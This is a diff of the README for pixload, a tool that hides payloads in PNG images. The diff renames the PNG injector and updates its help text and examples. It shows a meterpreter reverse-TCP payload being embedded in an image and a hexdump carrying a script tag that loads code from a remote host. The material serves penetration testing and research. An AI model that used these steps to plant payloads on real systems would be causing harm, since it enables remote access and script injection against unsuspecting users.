@@ -39,7 +39,7 @@ $ msfvenom -p php/meterpreter_reverse_tcp \
 
 3. Inject `payload.php` into the image (i.e. png).
 ```sh
-./pixload/png.pl -payload "$(cat payload.php)" -output payload.png
+./pixload-png -payload "$(cat payload.php)" -output payload.png
 ```
 
 ## SETUP
@@ -258,33 +258,40 @@ payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1
 0000009a
 ```
 
-### png.pl
+### pixload-png
 
-PNG Payload Creator/Injector.
-
-Create a PNG Image with custom/default payload, or inject
-payload into existing image.
-
-The payload is injecting into IDAT data chunks.
-
-##### Usage
+##### Help
 
 ```sh
-./png.pl [-payload 'STRING'] -output payload.png
+$ pixload-png --help
+```
 
-If the output file exists, then the payload will be injected into the
-existing file.  Else the new one will be created.
+```
+Usage: pixload-png [OPTION]... FILE
+Hide Payload/Malicious Code in PNG Images.
+
+Mandatory arguments to long options are mandatory for short options too.
+  -W, --pixelwidth  INTEGER   set pixel width for the new image (default: 32)
+  -H, --pixelheight INTEGER   set pixel height for the new image (default: 32)
+  -P, --payload STRING        set payload for injection
+  -v, --version               print version and exit
+  -h, --help                  print help and exit
+
+If the output FILE already exists, then payload will be injected into this
+existing file. Else, the new one will be created with specified pixels wide.
 ```
 
 ##### Example
 
 ```sh
-./png.pl -output payload.png
+$ pixload-png payload.png
+```
 
-[>|      PNG Payload Creator/Injector       |<]
-
-    https://github.com/chinarulezzz/pixload
-
+```
+........ PNG Payload Creator/Injector .........
+...............................................
+... https://github.com/chinarulezzz/pixload ...
+...............................................
 
 [>] Generating output file
 [✔] File saved to: payload.png
@@ -317,11 +324,16 @@ payload.png: PNG image data, 32 x 32, 8-bit/color RGB, non-interlaced
 00000060  45 4e 44 ae 42 60 82 00  00 00 00 00 00 00 00 00  |END.B`..........|
 00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
 *
-000000c0  00 1f 70 55 6e 6b 3c 73  63 72 69 70 74 20 73 72  |..pUnk<script sr|
-000000d0  63 3d 2f 2f 6e 6a 69 2e  78 79 7a 3e 3c 2f 73 63  |c=//nji.xyz></sc|
-000000e0  72 69 70 74 3e 9d 11 54  97 00 49 45 4e 44        |ript>..T..IEND|
-000000ee
+000000c0  00 23 50 55 6e 4b 3c 73  63 72 69 70 74 20 73 72  |.#PUnK<script sr|
+000000d0  63 3d 2f 2f 65 78 61 6d  70 6c 65 2e 63 6f 6d 3e  |c=//example.com>|
+000000e0  3c 2f 73 63 72 69 70 74  3e eb fd 2e 9f 00 49 45  |</script>.....IE|
+000000f0  4e 44                                             |ND|
+000000f2
 ```
+
+See
+L<pixload-png(1)|https://github.com/chinarulezzz/pixload/blob/master/pixload-png.1.pod>
+manual page for more information.
 
 ### webp.pl
 
